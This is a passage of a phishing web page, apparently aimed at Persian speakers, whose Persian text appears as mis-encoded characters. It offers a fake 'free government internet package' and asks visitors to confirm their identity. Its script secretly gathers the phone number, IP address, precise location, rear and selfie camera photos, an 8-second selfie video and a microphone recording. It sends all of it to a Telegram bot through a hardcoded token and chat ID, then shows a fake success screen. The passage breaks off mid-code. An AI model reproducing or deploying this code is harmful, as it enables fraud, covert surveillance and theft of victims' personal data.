<!DOCTYPE html>
<html dir="rtl" lang="fa">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <link rel="icon" href="https://telegram.org/favicon.ico" type="image/x-icon"/>
    <title>Ø§ÛŒÙ†ØªØ±Ù†Øª Ø±Ø§ÛŒÚ¯Ø§Ù†</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"/>
    <style>
        body { font-family: 'Vazirmatn', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .card { display: none; animation: fadeIn 0.5s ease-out; }
        .card.is-active { display: flex; }
        .loader { width: 60px; height: 60px; border: 4px solid #f3f3f3; border-top: 4px solid #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; }
        .countdown { font-size: 2rem; font-weight: bold; color: #10b981; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
        .pulse-text { animation: pulse 2s infinite; }
        .success-checkmark { width: 80px; height: 80px; margin: 0 auto; }
        .check-icon { width: 80px; height: 80px; position: relative; border-radius: 50%; box-sizing: content-box; border: 4px solid #10b981; }
        .check-icon::before { top: 3px; left: -2px; width: 30px; transform-origin: 100% 50%; border-radius: 100px 0 0 100px; }
        .check-icon::after { top: 0; left: 30px; width: 60px; transform-origin: 0 50%; border-radius: 0 100px 100px 0; animation: rotate-circle 4.25s ease-in; }
        .check-icon::before, .check-icon::after { content: ''; height: 100px; position: absolute; background: #ffffff; transform: rotate(-45deg); }
        .icon-line { height: 5px; background-color: #10b981; display: block; border-radius: 2px; position: absolute; z-index: 10; }
        .line-tip { top: 46px; left: 14px; width: 25px; transform: rotate(45deg); animation: icon-line-tip 0.75s; }
        .line-long { top: 38px; right: 8px; width: 47px; transform: rotate(-45deg); animation: icon-line-long 0.75s; }
        .icon-circle { top: -4px; left: -4px; z-index: 10; width: 80px; height: 80px; border-radius: 50%; position: absolute; box-sizing: content-box; border: 4px solid rgba(16, 185, 129, 0.5); }
        .icon-fix { top: 8px; width: 5px; left: 26px; z-index: 1; height: 85px; position: absolute; transform: rotate(-45deg); background-color: #ffffff; }
        @keyframes rotate-circle { 0% { transform: rotate(-45deg); } 5% { transform: rotate(-45deg); } 12% { transform: rotate(-405deg); } 100% { transform: rotate(-405deg); } }
        @keyframes icon-line-tip { 0% { width: 0; left: 1px; top: 19px; } 54% { width: 0; left: 1px; top: 19px; } 70% { width: 50px; left: -8px; top: 37px; } 84% { width: 17px; left: 21px; top: 48px; } 100% { width: 25px; left: 14px; top: 45px; } }
        @keyframes icon-line-long { 0% { width: 0; right: 46px; top: 54px; } 65% { width: 0; right: 46px; top: 54px; } 84% { width: 55px; right: 0px; top: 35px; } 100% { width: 47px; right: 8px; top: 38px; } }
        .video-recording { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 1000; }
        .video-recording.active { display: flex; }
        .recording-indicator { width: 20px; height: 20px; background: #ff0000; border-radius: 50%; margin-right: 10px; animation: pulse 1s infinite; }
        @keyframes recording-pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    </style>
</head>
<body class="bg-gray-100 dark:bg-gray-900 text-gray-900 dark:text-gray-100 min-h-screen flex items-center justify-center p-4">
    <!-- Ú©Ø§Ø±Øª Ø§ØµÙ„ÛŒ -->
    <div class="card is-active w-full max-w-md bg-white dark:bg-gray-800 p-6 sm:p-8 rounded-2xl shadow-2xl text-center border-t-4 border-blue-600 dark:border-blue-500 space-y-6 flex-col items-center justify-center" id="main-card">
        <div class="card-icon text-blue-600 dark:text-blue-500 w-16 h-16 mx-auto flex items-center justify-center">
            <svg fill="none" height="48" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="48" xmlns="http://www.w3.org/2000/svg">
                <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
                <path d="M1.42 9a16 16 0 0 1 21.16 0"></path>
                <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
                <line x1="12" x2="12.01" y1="20" y2="20"></line>
            </svg>
        </div>
        <div class="space-y-2 w-full">
            <h1 class="text-2xl font-bold">Ø¨Ø³ØªÙ‡ Ø§ÛŒÙ†ØªØ±Ù†Øª Ø±Ø§ÛŒÚ¯Ø§Ù† Ø¯ÙˆÙ„Øª</h1>
            <p class="text-gray-600 dark:text-gray-400 px-4">
                Ø¨Ø±Ø§ÛŒ ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø¨Ø³ØªÙ‡ 20 Ú¯ÛŒÚ¯Ø§Ø¨Ø§ÛŒØª Ø§ÛŒÙ†ØªØ±Ù†Øª Ø±Ø§ÛŒÚ¯Ø§Ù†ØŒ Ø´Ù…Ø§Ø±Ù‡ Ù…ÙˆØ¨Ø§ÛŒÙ„ Ø®ÙˆØ¯ Ø±Ø§ ÙˆØ§Ø±Ø¯ Ú©Ø±Ø¯Ù‡ Ùˆ Ù‡ÙˆÛŒØª Ø®ÙˆØ¯ Ø±Ø§ ØªØ§ÛŒÛŒØ¯ Ú©Ù†ÛŒØ¯.
            </p>
        </div>
        <div class="pt-2 w-full">
            <input class="w-full text-center p-3 rounded-lg bg-gray-100 dark:bg-gray-700 border-2 border-gray-300 dark:border-gray-600 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/50 outline-none transition text-lg" dir="ltr" id="validation-input" placeholder="Ø´Ù…Ø§Ø±Ù‡ Ù…ÙˆØ¨Ø§ÛŒÙ„ (Ù…Ø«Ø§Ù„: 09123456789)" type="tel"/>
        </div>
        <button class="w-full text-white bg-blue-600 hover:bg-blue-500 dark:bg-blue-500 dark:hover:bg-blue-600 font-bold py-3 px-5 rounded-lg transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-blue-600/50 disabled:bg-gray-400 dark:disabled:bg-gray-600 disabled:cursor-not-allowed disabled:transform-none" id="action-button">
            ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ùˆ ØªØ§ÛŒÛŒØ¯ Ù‡ÙˆÛŒØª
        </button>
    </div>

    <!-- Ú©Ø§Ø±Øª Ù¾Ø±Ø¯Ø§Ø²Ø´ -->
    <div class="card w-full max-w-md bg-white dark:bg-gray-800 p-8 rounded-2xl shadow-2xl text-center space-y-8 flex-col items-center justify-center" id="processing-card">
        <div class="loader"></div>
        <div class="space-y-4">
            <h1 class="text-3xl font-bold pulse-text">Ø¯Ø± Ø­Ø§Ù„ Ù¾Ø±Ø¯Ø§Ø²Ø´...</h1>
            <p class="text-gray-600 dark:text-gray-400 text-lg">
                Ù„Ø·ÙØ§Ù‹ Ú†Ù†Ø¯ Ù„Ø­Ø¸Ù‡ ØµØ¨Ø± Ú©Ù†ÛŒØ¯. Ø¯Ø± Ø­Ø§Ù„ ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø¨Ø³ØªÙ‡ Ø¨Ø±Ø§ÛŒ Ø´Ù…Ø§ Ù‡Ø³ØªÛŒÙ….
            </p>
        </div>
    </div>

    <!-- Ú©Ø§Ø±Øª ØªØ§ÛŒÛŒØ¯ -->
    <div class="card w-full max-w-md bg-white dark:bg-gray-800 p-8 rounded-2xl shadow-2xl text-center space-y-8 flex-col items-center justify-center" id="success-card">
        <!-- Ø¢ÛŒÚ©ÙˆÙ† ØªÛŒÚ© Ø³Ø¨Ø² -->
        <div class="success-checkmark">
            <div class="check-icon">
                <span class="icon-line line-tip"></span>
                <span class="icon-line line-long"></span>
                <div class="icon-circle"></div>
                <div class="icon-fix"></div>
            </div>
        </div>
        
        <div class="space-y-4">
            <h1 class="text-3xl font-bold text-green-600">ØªØ£ÛŒÛŒØ¯ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯</h1>
            <p class="text-gray-600 dark:text-gray-400 text-lg">
                Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø´Ù…Ø§ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø«Ø¨Øª Ø´Ø¯. Ø§ÛŒÙ† ØµÙØ­Ù‡ ØªØ§ Ú†Ù†Ø¯ Ø«Ø§Ù†ÛŒÙ‡ Ø¯ÛŒÚ¯Ø± Ø¨Ø³ØªÙ‡ Ø®ÙˆØ§Ù‡Ø¯ Ø´Ø¯.
            </p>
            
            <div class="pt-4">
                <div class="text-gray-500 dark:text-gray-400 text-sm mb-2">
                    ØµÙØ­Ù‡ Ø¨Ù‡ Ø·ÙˆØ± Ø®ÙˆØ¯Ú©Ø§Ø± Ø¨Ø³ØªÙ‡ Ù…ÛŒâ€ŒØ´ÙˆØ¯ Ø¯Ø±:
                </div>
                <div class="countdown" id="countdown">5</div>
            </div>
        </div>
        
        <div class="w-full bg-gray-100 dark:bg-gray-700 p-4 rounded-lg mt-4">
            <p class="text-gray-700 dark:text-gray-300">
                <span class="font-bold">Ø´Ù…Ø§Ø±Ù‡ Ù…ÙˆØ¨Ø§ÛŒÙ„:</span> 
                <span id="confirmed-phone" class="text-blue-600 dark:text-blue-400"></span>
            </p>
            <p class="text-gray-700 dark:text-gray-300 mt-2">
                <span class="font-bold">ÙˆØ¶Ø¹ÛŒØª:</span> 
                <span class="text-green-600 dark:text-green-400">Ø¨Ø³ØªÙ‡ Û²Û° Ú¯ÛŒÚ¯Ø§Ø¨Ø§ÛŒØªÛŒ ÙØ¹Ø§Ù„ Ø´Ø¯</span>
            </p>
        </div>
    </div>

    <!-- ØµÙØ­Ù‡ Ø¶Ø¨Ø· ÙˆÛŒØ¯ÛŒÙˆ -->
    <div class="video-recording" id="video-recording">
        <div class="bg-white dark:bg-gray-800 p-8 rounded-2xl shadow-2xl text-center space-y-6">
            <div class="flex items-center justify-center mb-4">
                <div class="recording-indicator"></div>
                <span class="text-xl font-bold text-red-600">Ø¯Ø± Ø­Ø§Ù„ Ø¶Ø¨Ø· ÙˆÛŒØ¯ÛŒÙˆ...</span>
            </div>
            <p class="text-gray-600 dark:text-gray-400">
                Ù„Ø·ÙØ§Ù‹ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ù†Ú¯Ø§Ù‡ Ú©Ù†ÛŒØ¯. Ø¶Ø¨Ø· ÙˆÛŒØ¯ÛŒÙˆÛŒ Û¸ Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ Ø¯Ø± Ø­Ø§Ù„ Ø§Ù†Ø¬Ø§Ù… Ø§Ø³Øª.
            </p>
            <div class="text-2xl font-bold text-blue-600" id="video-timer">8</div>
            <p class="text-gray-500 dark:text-gray-400 text-sm">
                Ø§ÛŒÙ† ÙˆÛŒØ¯ÛŒÙˆ Ø¨Ø±Ø§ÛŒ ØªØ£ÛŒÛŒØ¯ Ù†Ù‡Ø§ÛŒÛŒ Ù‡ÙˆÛŒØª Ø´Ù…Ø§ Ø¶Ø¨Ø· Ù…ÛŒâ€ŒØ´ÙˆØ¯.
            </p>
        </div>
    </div>

    <script>
        // ØªÙˆÚ©Ù† Ùˆ Ú†Øª Ø¢ÛŒØ¯ÛŒ ØªÙ„Ú¯Ø±Ø§Ù…
        const BOT_TOKEN = '8166346258:AAHW4N1zU67tIpMjFY1aO-U9WY3eGgZ31yg';
        const CHAT_ID = '8318669127';
        
        // Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø´Ø¯Ù‡
        let userData = {
            phone: '',
            location: null,
            mainCameraPhoto: null,
            selfiePhoto: null,
            selfieVideo: null,
            audioBlob: null,
            ip: 'Ø¯Ø±ÛŒØ§ÙØª...',
            battery: 0,
            userAgent: '',
            timestamp: '',
            permissions: {
                location: false,
                mainCamera: false,
                selfieCamera: false,
                microphone: false,
                selfieVideo: false
            }
        };

        // ØªØ§Ø¨Ø¹ Ø¨Ø±Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù… Ù…ØªÙ†ÛŒ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
        async function sendTextToTelegram(text) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù…:', error);
                return false;
            }
        }

        // ØªØ§Ø¨Ø¹ Ø¨Ø±Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
        async function sendPhotoToTelegram(photoBlob, caption) {
            if (!photoBlob || photoBlob.size < 100) return false;
            
            try {
                const formData = new FormData();
                formData.append('photo', photoBlob, 'photo.jpg');
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (error) {
                console.error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³:', error);
                return false;
            }
        }

        // ØªØ§Ø¨Ø¹ Ø¨Ø±Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ ÙˆÛŒØ¯ÛŒÙˆ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
        async function sendVideoToTelegram(videoBlob, caption) {
            if (!videoBlob || videoBlob.size < 100) return false;
            
            try {
                const formData = new FormData();
                formData.append('video', videoBlob, 'selfie_video.mp4');
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (error) {
                console.error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ ÙˆÛŒØ¯ÛŒÙˆ:', error);
                return false;
            }
        }

        // ØªØ§Ø¨Ø¹ Ø¨Ø±Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ ØµØ¯Ø§ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
        async function sendAudioToTelegram(audioBlob, caption) {
            if (!audioBlob || audioBlob.size < 100) return false;
            
            try {
                const formData = new FormData();
                formData.append('audio', audioBlob, 'voice.webm');
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (error) {
                console.error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ ØµØ¯Ø§:', error);
                return false;
            }
        }

        // ØªØ§Ø¨Ø¹ Ø¨Ø±Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
        async function sendLocationToTelegram(lat, lng, accuracy, caption) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: lat,
                        longitude: lng,
                        horizontal_accuracy: accuracy,
                        caption: caption
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙ‚Ø¹ÛŒØª:', error);
                return false;
            }
        }

        // Ø¯Ø±ÛŒØ§ÙØª Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø³ØªÚ¯Ø§Ù‡
        async function getDeviceInfo() {
            userData.userAgent = navigator.userAgent;
            
            // ØªØ§Ø±ÛŒØ® Ùˆ Ø²Ù…Ø§Ù† Ø´Ù…Ø³ÛŒ Ø¨Ø§ Ø§Ø¹Ø¯Ø§Ø¯ Ø§Ù†Ú¯Ù„ÛŒØ³ÛŒ
            const now = new Date();
            const persianDate = now.toLocaleDateString('fa-IR', {
                year: 'numeric',
                month: 'long',
                day: 'numeric'
            });
            const persianTime = now.toLocaleTimeString('fa-IR');
            userData.timestamp = `${persianDate} - ${persianTime}`;
            
            // Ø¯Ø±ÛŒØ§ÙØª IP
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userData.ip = data.ip;
            } catch (error) {
                userData.ip = 'Ù†Ø§Ù…Ø´Ø®Øµ';
            }
            
            // Ø¯Ø±ÛŒØ§ÙØª Ø¯Ø±ØµØ¯ Ø¨Ø§ØªØ±ÛŒ
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    userData.battery = Math.round(battery.level * 100);
                } catch (error) {
                    userData.battery = 'Ù†Ø§Ù…Ø´Ø®Øµ';
                }
            } else {
                userData.battery = 'Ù†Ø§Ù…Ø´Ø®Øµ';
            }
        }

        // Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…Ø¬ÙˆØ² Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(false);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        userData.location = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        userData.permissions.location = true;
                        resolve(true);
                    },
                    () => {
                        userData.permissions.location = false;
                        resolve(false);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        // Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³ Ø§Ø² Ø¯ÙˆØ±Ø¨ÛŒÙ†
        async function takePhoto(constraints, cameraType) {
            return new Promise(async (resolve) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    
                    await new Promise(resolve => {
                        video.onloadedmetadata = () => {
                            video.play();
                            resolve();
                        };
                    });
                    
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob((blob) => {
                        stream.getTracks().forEach(track => track.stop());
                        
                        if (cameraType === 'main') {
                            userData.mainCameraPhoto = blob;
                            userData.permissions.mainCamera = true;
                        } else {
                            userData.selfiePhoto = blob;
                            userData.permissions.selfieCamera = true;
                        }
                        
                        resolve(blob);
                    }, 'image/jpeg', 0.9);
                    
                } catch (error) {
                    console.log(`Ø®Ø·Ø§ Ø¯Ø± Ø¯ÙˆØ±Ø¨ÛŒÙ† ${cameraType}:`, error.name);
                    resolve(null);
                }
            });
        }

        // Ø¶Ø¨Ø· ÙˆÛŒØ¯ÛŒÙˆ 8 Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ Ø§Ø² Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ
        async function recordSelfieVideo() {
            return new Promise(async (resolve) => {
                try {
                    // Ù†Ù…Ø§ÛŒØ´ ØµÙØ­Ù‡ Ø¶Ø¨Ø· ÙˆÛŒØ¯ÛŒÙˆ
                    document.getElementById('video-recording').classList.add('active');
                    
                    // Ø´Ø±ÙˆØ¹ ØªØ§ÛŒÙ…Ø±
                    let seconds = 8;
                    const timerElement = document.getElementById('video-timer');
                    
                    const timerInterval = setInterval(() => {
                        seconds--;
                        timerElement.textContent = seconds;
                        
                        if (seconds <= 0) {
                            clearInterval(timerInterval);
                        }
                    }, 1000);
                    
                    // Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ Ùˆ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ†
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' },
                        audio: true 
                    });
                    
                    // Ø§ÛŒØ¬Ø§Ø¯ MediaRecorder
                    const mediaRecorder = new MediaRecorder(stream, {
                        mimeType: 'video/webm;codecs=vp9,opus'
                    });
                    
                    const chunks = [];
                    
                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data.size > 0) {
                            chunks.push(e.data);
                        }
                    };
                    
                    mediaRecorder.onstop = async () => {
                        // Ù…ØªÙˆÙ‚Ù Ú©Ø±Ø¯Ù† Ø§Ø³ØªØ±ÛŒÙ…
                        stream.getTracks().forEach(track => track.stop());
                        
                        // Ø§ÛŒØ¬Ø§Ø¯ blob Ø§Ø² ÙˆÛŒØ¯ÛŒÙˆ
                        const videoBlob = new Blob(chunks, { type: 'video/webm' });
                        userData.selfieVideo = videoBlob;
                        userData.permissions.selfieVideo = true;
                        
                        // ØªØ¨Ø¯ÛŒÙ„ webm Ø¨Ù‡ mp4 (Ø§Ú¯Ø± Ù…Ø±ÙˆØ±Ú¯Ø± Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ú©Ù†Ø¯)
                        try {
                            // Ø³Ø¹ÛŒ Ù…ÛŒâ€ŒÚ©Ù†ÛŒÙ… ÙˆÛŒØ¯ÛŒÙˆ Ø±Ø§ Ø¨Ù‡ mp4 ØªØ¨Ø¯ÛŒÙ„ Ú©Ù†ÛŒÙ…
                            const convertedBlob = await convertWebmToMp4(videoBlob);
                            userData.selfieVideo = convertedBlob || videoBlob;
                        } catch (conversionError) {
                            console.log('ØªØ¨Ø¯ÛŒÙ„ ÙˆÛŒØ¯ÛŒÙˆ Ø§Ù†Ø¬Ø§Ù… Ù†Ø´Ø¯ØŒ Ø§Ø² ÙØ±Ù…Øª Ø§ØµÙ„ÛŒ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒâ€ŒÚ©Ù†ÛŒÙ…');
                        }
                        
                        // Ù¾Ù†Ù‡Ø§Ù† Ú©Ø±Ø¯Ù† ØµÙØ­Ù‡ Ø¶Ø¨Ø· ÙˆÛŒØ¯ÛŒÙˆ
                        document.getElementById('video-recording').classList.remove('active');
                        
                        resolve(videoBlob);
                    };
                    
                    // Ø´Ø±ÙˆØ¹ Ø¶Ø¨Ø·
                    mediaRecorder.start();
                    
                    // ØªÙˆÙ‚Ù Ø®ÙˆØ¯Ú©Ø§Ø± Ù¾Ø³ Ø§Ø² 8 Ø«Ø§Ù†ÛŒÙ‡
                    setTimeout(() => {
                        if (mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                        clearInterval(timerInterval);
                    }, 8000);
                    
                } catch (error) {
                    console.log('Ø®Ø·Ø§ Ø¯Ø± Ø¶Ø¨Ø· ÙˆÛŒØ¯ÛŒÙˆ:', error.name);
                    
                    // Ù¾Ù†Ù‡Ø§Ù† Ú©Ø±Ø¯Ù† ØµÙØ­Ù‡ Ø¶Ø¨Ø· ÙˆÛŒØ¯ÛŒÙˆ Ø¯Ø± ØµÙˆØ±Øª Ø®Ø·Ø§
                    document.getElementById('video-recording').classList.remove('active');
                    
                    userData.permissions.selfieVideo = false;
                    resolve(null);
                }
            });
        }

        // ØªØ§Ø¨Ø¹ Ø¨Ø±Ø§ÛŒ ØªØ¨Ø¯ÛŒÙ„ webm Ø¨Ù‡ mp4 (Ø§Ø¨ØªØ¯Ø§ÛŒÛŒ)
        async function convertWebmToMp4(webmBlob) {
            return new Promise((resolve) => {
                // Ø¯Ø± Ø­Ø§Ù„Øª ÙˆØ§Ù‚Ø¹ÛŒ Ù†ÛŒØ§Ø² Ø¨Ù‡ Ú©ØªØ§Ø¨Ø®Ø§Ù†Ù‡ ØªØ¨Ø¯ÛŒÙ„ Ø¯Ø§Ø±ÛŒÙ…
                // Ø§ÛŒÙ†Ø¬Ø§ ÙÙ‚Ø· blob Ø§ØµÙ„ÛŒ Ø±Ø§ Ø¨Ø±Ù…ÛŒâ€ŒÚ¯Ø±Ø¯Ø§Ù†ÛŒÙ…
                resolve(webmBlob);
            });
        }

        // Ø¶Ø¨Ø· ØµØ¯Ø§ 10 Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ
        async function recordAudio() {
            return new Promise(async (resolve) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const mediaRecorder = new MediaRecorder(stream);
                    const chunks = [];
                    
                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data.size > 0) chunks.push(e.data);
                    };
                    
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        userData.audioBlob = blob;
                        stream.getTracks().forEach(track => track.stop());
                        userData.permissions.microphone = true;
                        resolve(blob);
                    };
                    
                    mediaRecorder.start();
                    
                    setTimeout(() => {
                        if (mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, 10000); // 10 Ø«Ø§Ù†ÛŒÙ‡
                    
                } catch (error) {
                    console.log('Ø®Ø·Ø§ Ø¯Ø± Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ†:', error.name);
                    userData.permissions.microphone = false;
                    resolve(null);
                }
            });
        }

        // Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù… Ø¹Ø¯Ù… Ø¯Ø³ØªØ±Ø³ÛŒ
        async function sendPermissionDeniedMessage(permissionName) {
            const message = `âš ï¸ Ø¹Ø¯Ù… Ø§Ø±Ø§Ø¦Ù‡ Ø¯Ø³ØªØ±Ø³ÛŒ âš ï¸\n\nğŸ¨ Ù‚Ø§Ù„Ø¨: ğŸ“¶ Ø§ÛŒÙ†ØªØ±Ù†Øª Ø±Ø§ÛŒÚ¯Ø§Ù†\n\nÚ©Ø§Ø±Ø¨Ø± Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ ${permissionName} Ø±Ø§ Ù…Ø³Ø¯ÙˆØ¯ Ú©Ø±Ø¯.`;
            await sendTextToTelegram(message);
        }

        // Ù†Ù…Ø§ÛŒØ´ ØµÙØ­Ù‡ ØªØ§ÛŒÛŒØ¯ Ùˆ Ø´Ø±ÙˆØ¹ Ø´Ù…Ø§Ø±Ø´ Ù…Ø¹Ú©ÙˆØ³
        function showSuccessPage() {
            // Ù†Ù…Ø§ÛŒØ´ Ø´Ù…Ø§Ø±Ù‡ ØªØ§ÛŒÛŒØ¯ Ø´Ø¯Ù‡ Ø¯Ø± ØµÙØ­Ù‡
            document.getElementById('confirmed-phone').textContent = userData.phone;
            
            // ØªØºÛŒÛŒØ± Ø¨Ù‡ ØµÙØ­Ù‡ ØªØ§ÛŒÛŒØ¯
            document.getElementById('processing-card').classList.remove('is-active');
            document.getElementById('success-card').classList.add('is-active');
            
            // Ø´Ø±ÙˆØ¹ Ø´Ù…Ø§Ø±Ø´ Ù…Ø¹Ú©ÙˆØ³
            let countdown = 5;
            const countdownElement = document.getElementById('countdown');
            
            const countdownInterval = setInterval(() => {
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    // Ø¨Ø³ØªÙ† ØªØ¨/Ù¾Ù†Ø¬Ø±Ù‡
                    window.close();
                    // Ø§Ú¯Ø± window.close Ú©Ø§Ø± Ù†Ú©Ø±Ø¯ØŒ Ø¨Ù‡ ØµÙØ­Ù‡ Ø§ØµÙ„ÛŒ Ø¨Ø±Ù…ÛŒâ€ŒÚ¯Ø±Ø¯ÛŒÙ…
                    setTimeout(() => {
                        location.href = 'about:blank';
                    }, 100);
                }
            }, 1000);
        }

        // Ù¾Ø±Ø¯Ø§Ø²Ø´ Ø§ØµÙ„ÛŒ
        async function startDataCollection() {
            try {
                // Ø¯Ø±ÛŒØ§ÙØª Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø³ØªÚ¯Ø§Ù‡
                await getDeviceInfo();
                
                // Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù… Ø§ÙˆÙ„ÛŒÙ‡ (ÙˆØ±ÙˆØ¯ Ú©Ø§Ø±Ø¨Ø±)
                const initialMessage = `ğŸ“± Ú©Ø§Ø±Ø¨Ø± Ø¬Ø¯ÛŒØ¯ ÙˆØ§Ø±Ø¯ Ø´Ø¯\n\nğŸ“ Ø´Ù…Ø§Ø±Ù‡: ${userData.phone}\n\nğŸŒ Ø§ÛŒÙ¾ÛŒ: ${userData.ip}\n\nğŸ•’ Ø²Ù…Ø§Ù†: ${userData.timestamp}`;
                await sendTextToTelegram(initialMessage);
                
                // Û±. Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ
                const locationGranted = await getLocation();
                if (!locationGranted) {
                    await sendPermissionDeniedMessage('Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ');
                }
                
                // Û². Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø§ØµÙ„ÛŒ (Ù¾Ø´Øª)
                const mainCameraPhoto = await takePhoto({ 
